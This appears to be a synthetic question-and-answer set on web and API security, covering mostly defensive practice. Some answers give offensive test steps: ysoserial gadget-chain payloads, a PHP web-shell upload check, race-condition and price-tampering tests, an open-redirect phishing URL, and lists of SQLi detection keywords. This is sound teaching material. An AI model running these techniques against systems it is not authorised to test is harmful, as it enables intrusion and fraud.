Question: What are the pros and cons of using a WAF versus fixing the application itself?
Answer:
- Fixing the Application (The Right Way): Pro: It eliminates the vulnerability at its source, which is the most secure and permanent solution. Con: It can be slow and expensive.
- Using a WAF (A Compensating Control): Pro: It can provide immediate, broad protection against common attacks ("virtual patching") and can be deployed quickly. Con: It is not foolproof, can be bypassed by clever attackers, and does not fix the underlying insecure code.
A WAF is a great defense-in-depth layer, but it should not be a substitute for secure coding.

---

Question: How can API versioning introduce security risk if not managed properly?
Answer: The biggest risk is improper inventory management. If an old, vulnerable version of the API (e.g., `/api/v1`) is not properly retired and is left running on the server, attackers can simply switch to the old version to exploit vulnerabilities that have already been fixed in the current version.

---

Question: What checks should be part of a secure API deployment checklist?
Answer:
1. No Secrets in Code: Ensure no API keys, passwords, or other secrets are hardcoded.
2. Debug Mode Disabled: Ensure debug mode is turned off in production to prevent leaking sensitive information in error messages.
3. Vulnerable Components Scan: Run a scan to ensure no third-party libraries have known CVEs.
4. Security Headers Present: Check that headers like HSTS and CSP are correctly configured.
5. Least Privilege: The API's database user and service account should have the minimum permissions necessary.
6. Logging Enabled: Ensure sufficient logging is configured to detect and investigate attacks.

---

Question: How can you fingerprint the database engine without exploiting it?
Answer: Different database engines have unique behaviors that can be used for fingerprinting:
- String Concatenation: `SELECT 'a' + 'b'` works differently in SQL Server (`ab`) and MySQL (`0`).
- Version Functions: `SELECT @@version` (MySQL, SQL Server) vs. `SELECT version()` (PostgreSQL).
- Error Messages: The syntax and content of error messages are often unique to a specific database.
- Time Delays: The syntax for sleep/delay functions (`WAITFOR DELAY`, `SLEEP()`, `pg_sleep()`) is different for each major database.

---

Question: What are effective defenses against time-based blind SQLi extraction?
Answer:
1. Parameterized Queries: This is the primary defense that prevents the injection in the first place.
2. WAF/IDS Anomaly Detection: A security system can detect if an API that normally responds in 50ms suddenly starts taking 5000ms, which is a strong indicator of a time-based attack.
3. Limit Database Permissions: The database user should not have permissions to execute sleep or benchmark functions.

---

Question: How do you test GraphQL for overly expensive or nested queries?
Answer:
1. Nested Queries: Craft a query that leverages a nested relationship in the schema (e.g., user -> friends -> friends of friends) and nest it 10-20 levels deep.
2. Large Data Requests: Find a query that returns a list of items and request a huge number, like `items(first: 10000)`.
A secure API will have protections like query depth limiting and cost analysis to reject these queries before they execute.

---

Question: What are the security risks of enabling GraphQL introspection in production?
Answer: Introspection allows anyone to ask the API for its entire schema. While useful for development, in production it gives an attacker a complete, detailed map of the entire API surface. It tells them every possible query, mutation, type, and field, making it trivial to find potential vulnerabilities to target.

---

Question: How can you test for insecure deserialization in JSON or binary formats?
Answer: This is an advanced test.
1. Identify the framework and language used by the API.
2. Use a tool like `ysoserial` (for Java) or `ysoserial.net` (for .NET) to generate a "gadget chain" payload for that specific technology. This payload is a serialized object that, when deserialized by the application, will execute a command.
3. Send this payload as the raw body of a request to an endpoint that accepts serialized data.

---

Question: How do you detect token replay attacks in a stateless API environment?
Answer: Since a stateless API has no memory, it needs a way to identify a replayed token. The most common mechanism is using the `jti` (JWT ID) and `exp` (expiration time) claims in a JWT. The server must maintain a short-lived cache of the `jti` of all processed tokens. If a token with a `jti` that is already in the cache is received, it is a replay and should be rejected.

---

Question: What is the safe way to implement RBAC in a microservices architecture?
Answer: A centralized Identity Provider (IDP) is the recommended pattern. The IDP issues a JWT that contains the user's roles or permissions as claims (e.g., `"roles": ["admin", "editor"]`). When a request comes to a microservice, the service can validate the JWT's signature and then inspect these claims locally to make its authorization decisions, without needing to call a central authorization service for every request.

---

Question: How can you harden password reset flows to prevent account takeover?
Answer:
1. Use long, random, and single-use reset tokens.
2. Expire the reset token after a short period (e.g., 15-60 minutes).
3. Invalidate all other active sessions for the user when their password is successfully reset.
4. Send a notification to the user's email address when their password has been changed.
5. Implement rate limiting on the "request a reset" feature to prevent email spamming.

---

Question: What is HTTP request smuggling and how can it affect API security?
Answer: HTTP request smuggling is a technique where an attacker sends an ambiguous HTTP request that is interpreted differently by the front-end proxy (like a load balancer) and the back-end server. This can allow an attacker to "smuggle" a malicious second request inside the first one, which can be used to bypass security controls on the proxy and directly attack the back-end server.

---

Question: How can client-side validation be bypassed and why is server validation required?
Answer: Client-side validation (e.g., JavaScript checks in the browser) is purely for improving the user experience. An attacker can easily bypass it by:
1. Turning off JavaScript in their browser.
2. Using a tool like Postman or Burp Suite to craft and send a raw HTTP request directly to the API, completely ignoring the UI.
Therefore, all validation MUST be duplicated and enforced on the server-side, as it is the only validation that can be trusted.

---

Question: What are the best practices for secret rotation for service-to-service credentials?
Answer:
1. Automation: Secret rotation should be fully automated. Manual rotation is error-prone and often forgotten.
2. Zero Downtime: The rotation process should allow for a graceful transition. The system should support both the old and the new secret for a short period to prevent service interruptions.
3. Frequency: The rotation frequency depends on the criticality of the secret, but a common best practice is to rotate secrets every 90 days.
4. Use a Secrets Manager: A tool like HashiCorp Vault or AWS Secrets Manager should be used to automate and manage the entire rotation lifecycle.

---

Question: How do you safely expose third-party webhooks without opening SSRF?
Answer: When your application receives a webhook call from a third party, it should never blindly trust or follow any URLs provided in the webhook's payload. If you must make a request based on the webhook, the URL should be validated against a strict allow-list of known, trusted domains. Any other URL should be rejected.

---

Question: What logging and alert thresholds help detect data exfiltration attempts?
Answer:
1. Response Size Anomaly: Alert if an API endpoint that normally returns a few kilobytes of data suddenly returns a response that is megabytes or gigabytes in size.
2. High Volume of Requests: Alert if a single user or IP address makes an unusually high number of requests to data-sensitive endpoints in a short period.
3. Database Query Timeouts: A spike in database timeouts can indicate an attacker is running complex queries to exfiltrate large amounts of data.

---

Question: How should error messages be structured to avoid leaking internal details?
Answer: Secure error messages should be generic and provide just enough information for the user to understand the problem.
- Bad (Leaky): `SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'test@example.com' for key 'users.email_unique'`
- Good (Secure): `{"error": "This email address is already in use."}`
All detailed error information, including stack traces, should only be written to server-side logs, never returned to the client.

---

Question: What is the role of canary tokens in detecting automated exploitation?
Answer: A canary token is a unique "digital tripwire" that you can place in your system. For example, you can embed a fake AWS API key in your code or a configuration file. If an attacker breaches your system and exfiltrates that key, the moment they try to use it, the canary token service will send you an immediate alert, notifying you of the breach.

---

Question: How can you safely test rate limiting without causing collateral DoS?
Answer:
1. Test in a Staging Environment: The best approach is to perform aggressive rate limiting tests in a dedicated, isolated staging environment that mirrors production.
2. Target a Specific Test Account: If testing in production, all tests should be performed against a single, non-critical test account.
3. Gradual Ramp-Up: Start with a low number of requests and gradually increase the volume while monitoring the system's health to find the breaking point without causing a major outage.

---

Question: What are common pitfalls when implementing role escalation protection?
Answer:
1. Implicit Trust: Trusting a claim from a JWT (like `"isAdmin": true`) without verifying it against a definitive source of truth in a database.
2. Insecure Direct Object References: Allowing a user to change their role by simply passing a `role_id` in a request, without checking if they have the permission to do so.
3. Mixing User and Admin APIs: Having a single `/users/{id}` endpoint where a regular user can only update their own data, but an admin can update anyone's. This is complex and prone to errors. It's safer to have separate `/api/users/me` and `/api/admin/users/{id}` endpoints.

---

Question: How do you identify stale or forgotten API endpoints in a large system?
Answer:
1. API Inventory: The first step is to create a complete inventory of all known endpoints from documentation and source code.
2. Log Analysis: Analyze API gateway or web server access logs. Any endpoint from your inventory that has not received any traffic in a long time (e.g., 6 months) is a candidate for being stale.
3. Active Scanning: Use tools like Kiterunner to scan for undocumented endpoints that may have been forgotten.

---

Question: What are the consequences of allowing user-supplied redirects (open redirect)?
Answer: An open redirect vulnerability allows an attacker to use your trusted domain to redirect users to a malicious website. This is often used in phishing attacks. An attacker sends an email with a link like `https://your-trusted-app.com/redirect?url=http://evil-phishing-site.com`. The user sees the trusted domain, clicks the link, and is then immediately redirected to the phishing site to have their credentials stolen.

---

Question: How can you test if a file upload is being executed as code on the server?
Answer:
1. Upload a Web Shell: The most direct test is to upload a simple web shell. For a PHP server, this could be a file named `shell.php` with the content `<?php phpinfo(); ?>`.
2. Access the File: After uploading, try to access the file via its URL (e.g., `https://your-app.com/uploads/shell.php`).
3. Observe the Output: If you see the PHP info page instead of the raw source code, it means the server executed the file, and you have Remote Code Execution (RCE).

---

Question: What metrics should a security dashboard display for API health and threat detection?
Answer: A good security dashboard should display:
- Authentication Failures: A graph of failed login attempts over time.
- 4xx/5xx Error Rates: Spikes in client-side (4xx) or server-side (5xx) errors can indicate attacks or system failures.
- Top IP Addresses by Request Volume: To identify potential bot activity.
- Latency Percentiles: A sudden increase in API response time can indicate a DoS or a resource-intensive attack.
- Security Events: A log of WAF blocks, critical exceptions, and other security-specific alerts.

---

Question: How to design effective allow-lists for accepted MIME types and file signatures?
Answer:
1. MIME Type vs. Extension: Always validate both the file extension AND the MIME type. Do not trust the `Content-Type` header sent by the client.
2. File Signature (Magic Bytes): The most robust method is to read the first few bytes of the uploaded file. These "magic bytes" identify the true file type (e.g., a real JPEG file always starts with `FF D8 FF`). Validate these bytes against an allow-list of known, safe file signatures. This prevents an attacker from simply renaming `shell.php` to `image.jpg`.

---

Question: What are the security tradeoffs of using API keys vs OAuth2 for machine clients?
Answer:
- API Keys: Pro: They are very simple to implement and use. Con: They are often long-lived, have no granular permissions, and if leaked, provide full access until manually revoked.
- OAuth2 (Client Credentials Flow): Pro: This is the more secure and modern standard. It allows for short-lived access tokens, granular scopes (permissions), and a standard way to revoke access. Con: It is more complex to implement.
For any serious application, OAuth2 is the recommended approach.

---

Question: How do you test for header-based injection vulnerabilities (User-Agent, Referer)?
Answer: Use a proxy like Burp Suite to intercept a normal request from your browser. In Burp Repeater, systematically modify the values of the `User-Agent`, `Referer`, and other standard headers to include injection payloads (like a single quote for SQLi or a `<script>` tag for XSS). This is important for testing applications that log these headers to a database or display them on an admin panel.

---

Question: What is parameter pollution and how might it be abused in different backends?
Answer: HTTP Parameter Pollution (HPP) occurs when an attacker sends multiple parameters with the same name. How it's abused depends on the backend technology:
- ASP.NET: Combines all values into a comma-separated string (`val1,val2`).
- PHP/Apache: Uses the last value provided.
- Node.js/Express: Creates an array of the values (`['val1', 'val2']`).
An attacker can use this knowledge to bypass WAF rules or override application logic by knowing which of their polluted parameters will be processed.

---

Question: How do you test for insecure default permissions on newly created DB users?
Answer: This requires access to the database. After identifying the database user that the web application connects with, you should check its privileges. A common mistake is to grant the user `db_owner` or `SUPER` privileges. A web application user should only have the minimum required `SELECT`, `INSERT`, `UPDATE`, and `DELETE` permissions on the specific tables it needs to function.

Question: What is the impact of verbose SQL error messages in production, and how to mitigate it?
Answer: The impact is that they provide an attacker with a roadmap to exploit the application. The error messages can reveal the database type, version, table names, and column names, which is critical information for crafting a successful SQL injection payload. Mitigation involves configuring the application to catch all database exceptions and return a generic, non-descriptive error message to the user, while logging the full, detailed error on the server side for debugging.

Question: How can database permissions enforce the principle of least privilege?
Answer: The database user account that the web application uses should be granted only the minimum necessary permissions. For example:
- It should NOT have permission to create or drop tables.
- It should NOT have permission to execute system commands or read/write files.
- It should only have `SELECT`, `INSERT`, `UPDATE`, `DELETE` permissions on the specific tables and views required for the application's functionality.
This limits the damage an attacker can do even if they achieve a successful SQL injection.

Question: What are safe approaches to logging SQL queries for debugging without exposing secrets?
Answer:
1. Log Parameterized Queries: Log the SQL query template with placeholders, and then log the parameter values separately. Never log the fully rendered query with the data already embedded in it.
2. Redact Sensitive Parameters: Even when logging parameters separately, automatically identify and redact or mask any parameter values that correspond to sensitive fields like passwords, API keys, or PII.
3. Use a Library Feature: Many modern database libraries and ORMs have a "safe logging" mode that automatically handles this separation for you.

---

Question: How do you validate and sanitize data used in server-side template engines?
Answer: Data used in templates (like Jinja2, Pug, etc.) can be a vector for Server-Side Template Injection (SSTI) or XSS.
1. Avoid User-Controlled Templates: Never allow users to submit or modify the template strings themselves.
2. Contextual Auto-Escaping: Use a modern template engine that provides contextual auto-escaping by default. This will automatically encode data to prevent XSS.
3. Sanitize Input: Before passing data to the template, validate it against a strict schema. For any data that is expected to be HTML, run it through a robust HTML sanitizer library (like DOMPurify) to strip out any malicious tags or attributes.

---

Question: What are the key indicators of automated SQLi scanning in access logs?
Answer:
- High Volume of Requests: A single IP address making hundreds of requests in a short time to many different pages.
- Suspicious URL Parameters: The logs will show classic SQLi payloads in the query parameters, such as single quotes, `--`, `UNION SELECT`, and `SLEEP()`.
- High Error Rate: The logs will show a large number of 4xx and 5xx HTTP status codes as the scanner's payloads cause errors in the application.
- Sequential Probing: The requests often follow a predictable, non-human pattern, like testing one parameter on every page, then moving to the next.

---

Question: How can you detect chained vulnerabilities (e.g., SSRF → internal auth access)?
Answer: Detecting chained vulnerabilities requires correlating events across different systems. For example:
1. An alert fires from the WAF for a potential SSRF attempt from an external IP.
2. Shortly after, an internal application log shows a successful login or an unusual API call coming from the IP address of the server that was the target of the SSRF.
Connecting these two separate events indicates that the attacker successfully pivoted from the external vulnerability to an internal action.

---

Question: What hardening steps should be applied to XML parsers to prevent XXE?
Answer: The most critical step is to disable Document Type Definitions (DTD) and external entity resolution. The exact method varies by library, but typically involves setting properties like these to false:
- `http://xml.org/sax/features/external-general-entities`
- `http://xml.org/sax/features/external-parameter-entities`
- `http://apache.org/xml/features/disallow-doctype-decl`
This effectively turns off the features that XXE attacks rely on.

---

Question: How can you validate that a WAF rule set isn’t blocking legitimate internal research files?
Answer: This is a false positive management issue.
1. Create a comprehensive test suite of known legitimate but "suspicious-looking" requests that your application needs to process.
2. Run this test suite against the WAF when it's in a non-blocking "logging only" mode.
3. Analyze the WAF logs to see which legitimate requests were flagged.
4. Fine-tune the WAF rules or create specific exceptions to allow this legitimate traffic without weakening the overall security posture.

---

Question: How do you safely store and rotate TLS private keys for internal services?
Answer: Private keys should never be stored in source code or on disk in plaintext.
- Storage: Use a dedicated secrets management system like HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault. The application should retrieve the key at runtime with proper authentication.
- Rotation: Rotation should be automated. Use a tool like `certbot` or a feature of your secrets manager to automatically generate a new key and certificate before the old one expires, and then deploy it to the relevant services without manual intervention.

---

Question: What is the effect of content-type sniffing on file upload security?
Answer: If a user uploads a file like `shell.php` but gives it a `.jpg` extension, the server might save it as `shell.jpg`. However, if `X-Content-Type-Options: nosniff` is not set, some browsers might ignore the server's `Content-Type: image/jpeg` header, "sniff" the file's content, see that it looks like a script, and try to execute it. This can re-enable XSS-like attacks.

---

Question: How can you design API endpoints to fail closed rather than fail open?
Answer: "Fail closed" is a design principle where the default outcome of any check is denial. In practice, this means:
- Authorization logic should start with `deny`. Access should only be granted if a specific rule explicitly allows it.
- In `try...catch` blocks, the `catch` block (the failure case) should always return an authorization error, not fall through to an insecure state.
- If an authorization service is unavailable, the API should deny the request rather than assuming the user has permission.

---

Question: What methods prevent CSRF in API flows used by browsers?
Answer:
1. SameSite Cookies: Setting the `SameSite=Strict` or `SameSite=Lax` attribute on session cookies is the most effective modern defense. This prevents the browser from sending the cookie with cross-site requests.
2. Anti-CSRF Tokens: The traditional method. The server provides a unique, random token to the client. The client must include this token in a custom HTTP header (e.g., `X-CSRF-Token`) with every state-changing request. The server then validates this token.
3. Checking the Origin/Referer Header: Verifying that the request is coming from a trusted domain provides some protection but is less reliable than tokens.

---

Question: How to evaluate whether a third-party dependency introduces unacceptable risk?
Answer:
1. Vulnerability Scanning: Use a Software Composition Analysis (SCA) tool (like Snyk, Dependabot) to continuously scan the dependency for known CVEs.
2. Popularity and Maintenance: Is the library widely used and actively maintained? A project with a recent commit history is less likely to have unpatched vulnerabilities.
3. Security-Awareness: Does the project have a security policy, a way to report vulnerabilities, and a track record of fixing them quickly?
4. Transitive Dependencies: Analyze not just the library itself, but all the other libraries that it depends on, as these can also introduce risk.

---

Question: What is credential stuffing detection and mitigation in user authentication flows?
Answer: Credential stuffing is an attack where bots use lists of credentials stolen from other websites to try to log in to your application.
- Detection: Monitor for a high volume of failed logins from a single IP or a low success rate overall.
- Mitigation: Implement Multi-Factor Authentication (MFA), use rate limiting on login attempts, and use CAPTCHA after a few failed attempts to block bots.

---

Question: How can you safely implement administrative audit logging without privacy violations?
Answer:
1. Log Events, Not Data: The audit log should record the event that occurred (e.g., `user_record_viewed`), who performed it (`admin_id: 123`), the target (`user_id: 456`), and a timestamp.
2. Avoid Logging PII: The audit log should not contain the actual sensitive PII that was viewed. If an investigator needs to see the data, they can use the log entry to find the specific record in the main database with proper authorization.
3. Access Control: The audit logs themselves are sensitive data and must be protected with strict access controls.

---

Question: What are effective heuristics to distinguish benign from malicious payloads in logs?
Answer:
- Presence of SQL Keywords: Benign user input rarely contains words like `UNION`, `SELECT`, `xp_cmdshell`.
- Special Characters: A high frequency of single quotes, semicolons, dashes, and comment characters is suspicious.
- Script Tags: The presence of `<script>` or event handlers like `onerror` is a strong indicator of XSS.
- Path Traversal: Repetitive sequences of `../` or `..\\` are a clear sign of a path traversal attempt.
- Known Tool Signatures: Automated tools often have a unique `User-Agent` string or use a predictable sequence of test payloads.

---

Question: How do you design rate limiting that differentiates between legitimate bursts and attacks?
Answer: A sophisticated rate limiting system uses a "leaky bucket" or "token bucket" algorithm. This allows for legitimate bursts of traffic (e.g., a user quickly loading a page with 10 API calls) but will throttle or block a sustained, high-volume stream of requests that is characteristic of an attack. It can also use more advanced logic, like applying stricter limits to computationally expensive endpoints.

---

Question: How to safely use CSP nonces and hashes in dynamic content environments?
Answer:
- Nonces: A nonce is a unique, random string that is generated for every single HTTP request. It is included in the CSP header (`script-src 'nonce-RANDOMVALUE'`) and also as an attribute on every legitimate `<script>` tag in the HTML. This ensures that only scripts with the correct nonce for that specific request can execute.
- Hashes: The server calculates the hash (e.g., SHA256) of the content of a legitimate inline script. It includes this hash in the CSP header (`script-src 'sha256-HASHVALUE'`). The browser then calculates the hash of every inline script on the page and only executes the ones that match the hash in the header.

---

Question: What are secure patterns for accepting user-provided URLs (to prevent SSRF)?
Answer:
1. Allow-List Validation: The most secure pattern. Validate the user-provided URL against a hardcoded list of trusted domains and paths.
2. IP Address Blocking: Deny any URL that resolves to a private, reserved, or loopback IP address space.
3. Follow Redirects Cautiously: If you must follow redirects, perform the same validation on every URL in the redirect chain.
4. Disable Unused Schemes: Only allow the `http` and `https` schemes. Disable others like `file://`, `gopher://`, etc.

---

Question: How do you perform a threat model for a public API?
Answer: A common methodology is STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege).
1. Decompose the Application: Draw a data flow diagram showing the key components (e.g., gateway, auth service, user service, database) and the trust boundaries between them.
2. Identify Threats: For each data flow and component, brainstorm potential threats using the STRIDE categories. For example, "An unauthenticated user could tamper with the JWT to spoof an admin."
3. Determine Mitigations: For each threat, identify the security controls that should be in place to mitigate it (e.g., "The service must cryptographically validate the JWT signature.").

---

Question: What are the differences in testing mobile app APIs vs web app APIs?
Answer: The core API vulnerabilities are the same, but the context is different.
- Certificate Pinning: Mobile apps often use certificate pinning, which can make it harder to intercept traffic with a proxy like Burp Suite. This needs to be bypassed first.
- Binary Analysis: The mobile app binary (APK for Android, IPA for iOS) can be reverse-engineered to find hardcoded API keys, secret endpoints, or other sensitive information.
- Older API Versions: Mobile apps are not always updated by users, so it's more common to find users still using old, vulnerable API endpoints.

---

Question: How do you detect and mitigate dependency confusion in internal package registries?
Answer:
- Detection: Regularly scan your project's dependencies to see if any of your internal package names are available for registration on public repositories like npm or PyPI.
- Mitigation:
  1. Scope Your Packages: Use a private scope for all internal packages (e.g., `@mycompany/internal-package`).
  2. Reserve Public Names: Proactively register your internal package names on the public repositories to prevent an attacker from claiming them.
  3. Configure Your Build System: Ensure your package manager is configured to always check your private registry first and never fall back to the public one for scoped packages.

---

Question: What is the impact of caching on authorization-sensitive endpoints?
Answer: Caching can be very dangerous for authorization. If an API endpoint returns sensitive, user-specific data, and that response is cached by a shared cache (like a CDN or a reverse proxy), then a different user might be served the cached response containing the first user's private data. Authorization-sensitive responses should always include a `Cache-Control: no-store, private` header.

---

Question: How can you detect business-logic abuse (e.g., coupon farming) with analytics?
Answer: This requires analyzing user behavior patterns over time. Detection rules could include:
- Alerting on a single user account redeeming an unusually high number of unique coupon codes.
- Identifying a group of new accounts that are all created from the same IP address and all perform the same sequence of actions.
- Flagging accounts that consistently perform actions at a rate that is not possible for a human user.

---

Question: What are safe practices for serving generated files (PDF, CSV) to prevent injection?
Answer:
1. Separate Data from Commands: Use a reputable library to generate the file. Never manually construct the file by concatenating user input into a template. This prevents formula injection in CSVs or other command injections.
2. Set Correct Headers: Serve the file with a `Content-Disposition: attachment; filename="safe-filename.pdf"` header. This forces the browser to download the file rather than trying to render it inline. Also set a strict `Content-Type` header (e.g., `application/pdf`).

---

Question: How do you test an API for account enumeration issues?
Answer: Test the login, password reset, and registration features.
- Login: Provide a valid username and an invalid password, then an invalid username and an invalid password. The error messages should be identical and generic (e.g., "Invalid username or password.").
- Password Reset: Enter a valid email and an invalid email. Again, the response should be generic (e.g., "If an account with that email exists, a reset link has been sent.").
If the responses are different, the API is vulnerable to account enumeration.

---

Question: What controls prevent attackers from abusing bulk/async job endpoints?
Answer:
1. Strict Authorization: Ensure that only appropriately privileged users can initiate bulk operations.
2. Input Validation: Validate every single record in the bulk request, not just the overall request format.
3. Rate Limiting: Limit how many bulk jobs a single user can create in a given time period.
4. Resource Quotas: Enforce a maximum number of records that can be processed in a single bulk job.

---

Question: How to design a secure onboarding flow for new API consumers?
Answer:
1. Manual Vetting: For critical APIs, manually vet and approve new consumers before issuing production keys.
2. Scoped Keys: Issue keys with the absolute minimum set of permissions (scopes) that the consumer needs.
3. Provide Separate Environments: Give new consumers access to a sandboxed or staging environment for development and testing.
4. Clear Documentation: Provide clear documentation on security best practices, such as how to securely store their API key.

---

Question: What are the best practices for rate limiting by IP vs by API key vs by user id?
Answer: A tiered approach is best:
1. By IP: Apply a strict, low limit to all unauthenticated requests to protect against basic DoS and scanning.
2. By API Key: Apply a more generous limit to authenticated machine clients. This is the primary way to enforce usage quotas.
3. By User ID: Apply a limit to authenticated end-users. This prevents a single user with multiple devices or tokens from overwhelming the system.
This layered strategy provides granular control and fair resource allocation.

---

Question: How can you safely implement file type conversion on the server without RCE?
Answer:
1. Use a Reputable Library: Use a well-maintained, memory-safe library for the conversion. Do not shell out to a command-line utility (like ImageMagick), as this can lead to command injection.
2. Isolate the Process: Run the conversion process in a tightly sandboxed environment (e.g., a separate, short-lived container) with no network access and minimal permissions. This contains the damage if a vulnerability is found in the conversion library.
3. Resource Limits: Enforce strict limits on the CPU and memory that the conversion process can consume to prevent DoS.

---

Question: What methods prevent users from tampering with client-side feature flags?
Answer: All feature flag decisions must be made authoritatively on the server-side.
- Insecure: The API sends all data to the client, and the client-side code uses a feature flag like `if (user.hasPremiumFeature)` to decide whether to show it. An attacker can just modify the JavaScript to bypass this check.
- Secure: The client asks the API for the data. The server-side API checks the user's permissions and feature flags and only returns the data that the user is actually allowed to see. The client simply renders whatever the server gives it.

---

Question: How do you safely expose debugging endpoints without leaking secrets?
Answer:
1. Authentication and Authorization: Debugging endpoints must be protected by the same authentication and authorization as any other endpoint, and should require administrative privileges.
2. Environment-Specific: They should be completely disabled or removed from production builds. They should only exist in development or staging environments.
3. Redact Secrets: The output of any debugging endpoint should be designed to automatically redact any secrets, PII, or other sensitive information before it is displayed.

---

Question: What is the role of service mesh (mTLS) in preventing lateral movement?
Answer: A service mesh (like Istio or Linkerd) provides mutual TLS (mTLS) for all service-to-service communication within a network. This means that every microservice must present a valid, trusted certificate to prove its identity before it can communicate with another service. This helps prevent an attacker who has compromised one service from being able to freely make requests to other internal services (lateral movement).

---

Question: How to detect when an attacker is using timing side-channels to leak data?
Answer: This is very difficult to detect. It requires establishing a baseline of normal application performance and then looking for statistical anomalies. Key indicators would be a series of requests from a single IP where the response times fall into two distinct clusters (e.g., some are ~50ms, others are ~1050ms). This pattern is a strong signature of a time-based blind attack.

---

Question: What are the tradeoffs of logging full request bodies versus partial redaction?
Answer:
- Logging Full Bodies: Pro: Provides complete information for debugging and incident response. Con: High risk of logging sensitive PII, passwords, or secrets. Also creates large log files.
- Partial Redaction: Pro: Significantly improves security and privacy by masking sensitive fields. Con: Can make debugging more difficult if the redacted field is part of the problem. It also requires careful maintenance to ensure all new sensitive fields are added to the redaction list.
For most applications, partial redaction is the recommended and responsible choice.

---

Question: How should you handle error reporting in libraries to avoid leaking stack traces?
Answer: Libraries should use custom, defined exception classes. The main application code should have a global exception handler that catches these specific library exceptions, as well as any unhandled generic exceptions. This handler is responsible for logging the full, detailed exception (including the stack trace) to the server-side log, and then returning a generic, safe error message to the user. The library itself should never print or return the raw stack trace.

---

Question: How can API clients be fingerprinted and how do you respond to suspicious clients?
Answer: Clients can be fingerprinted by analyzing their request patterns:
- The `User-Agent` header.
- The set of TLS cipher suites they offer.
- The order and case of HTTP headers.
- Behavioral patterns, like the average time between requests.
If a client fingerprint matches a known malicious tool or exhibits bot-like behavior, you can respond by blocking their IP, serving them a CAPTCHA, or feeding them fake, "honeypot" data.

---

Question: What are practical mitigations for GraphQL field-level authorization issues?
Answer:
1. Centralized Logic: Use a library or pattern that allows you to define authorization rules in a central place and then apply them to multiple fields in your schema. This avoids duplicating logic.
2. Default Deny: The default authorization policy for any field should be to deny access. A resolver should only return data if a rule explicitly grants permission.
3. Batching Checks: To avoid performance issues from checking permissions on every single item in a list, perform a single authorization check before fetching the data.

---

Question: How do you safely test for race conditions in financial or inventory APIs?
Answer:
1. Dedicated Test Accounts: Create at least two separate, non-production user accounts with their own balances or inventory.
2. Idempotency Keys: If the API supports idempotency keys, use them. This is a mechanism designed to prevent duplicate requests from being processed.
3. Concurrency Tools: Use a tool like Burp Suite's Turbo Intruder or a custom multi-threaded script to send two conflicting requests (e.g., "transfer all money from A to B" and "transfer all money from A to C") at almost exactly the same time. Then, check the final state of the accounts to see if the race condition was exploitable.

---

Question: What is the risk model for accepting and storing user-supplied HTML?
Answer: The risk is stored Cross-Site Scripting (XSS). An attacker can submit HTML containing malicious `<script>` tags or `onerror` attributes. When another user views this content, the script executes in their browser, potentially stealing their session. The only safe way to handle this is to process the user-supplied HTML with a robust, well-maintained HTML sanitizer library (like DOMPurify) that strips all potentially dangerous tags and attributes before storing or rendering it.

---

Question: How to design and test quota systems for multi-tenant APIs?
Answer:
- Design: Quotas should be tracked per-tenant (per-API-key). The system should use a high-performance store like Redis to track the request count for each tenant within a given time window.
- Testing:
  1. Accuracy Test: Send a known number of requests (e.g., 99) and verify they all succeed. Send the 101st request and verify that it is correctly blocked with a `429 Too Many Requests` status code.
  2. Isolation Test: Hammer Tenant A's API key. At the same time, send a single request from Tenant B's key and verify that it is still processed successfully, proving that tenants cannot cause a DoS for each other.

---

Question: What are the best practices for storing encrypted PII in databases?
Answer:
1. Use a Modern, Authenticated Encryption Algorithm: Use a strong, authenticated encryption with associated data (AEAD) cipher like AES-256-GCM.
2. Key Management: Do not store the encryption keys in the same database or on the same server as the data. Use a dedicated Key Management Service (KMS) like AWS KMS, Azure Key Vault, or HashiCorp Vault.
3. Per-Record Keys: For maximum security, use envelope encryption, where each record is encrypted with its own unique data key, and that data key is then encrypted by a central master key from the KMS.

---

Question: How do you test for logic flaws that allow free transactions or refunds?
Answer: This requires creative, business-logic-focused testing.
1. Negative Numbers: Try to purchase `-1` items to see if it gives you a credit.
2. Parameter Tampering: Intercept the "complete purchase" request and try to change the price or quantity to a lower value before it is sent to the server.
3. Race Conditions: Try to use the same coupon code or gift card on two separate orders at the same time.
4. Step Skipping: Try to directly access the "order complete" page without going through the payment step.

---

Question: What are signs of API key leakage in public repositories and how to remediate?
Answer:
- Signs: Attackers use automated tools to scan public GitHub commits for strings that have a high entropy (a high degree of randomness), which is characteristic of API keys. They also search for common variable names like `API_KEY`, `SECRET_TOKEN`, etc.
- Remediation:
  1. Revoke Immediately: As soon as the leak is discovered, revoke the compromised key immediately to prevent abuse.
  2. Remove from History: Remove the key from the commit history using a tool like `git-filter-repo`. Simply committing a change to remove the key is not enough, as it remains in the history.
  3. Scan for Abuse: Analyze API logs to see if the leaked key was used maliciously.

---

Question: How do you create a reproducible, safe testbed (lab) for practicing offensive techniques without harming others?
Answer:
1. Use Purpose-Built Vulnerable Applications: Use well-known, intentionally vulnerable applications like the OWASP Juice Shop, DVWA (Damn Vulnerable Web Application), or PortSwigger's Web Security Academy labs. These are designed to be legally and safely attacked.
2. Containerization: Run these applications locally on your machine using Docker. This isolates the vulnerable application from your main operating system and network.
3. Local Network: Ensure all your testing tools and the target application are running on a private, local network on your machine, with no access to or from the public internet. This creates a completely self-contained and safe hacking lab.
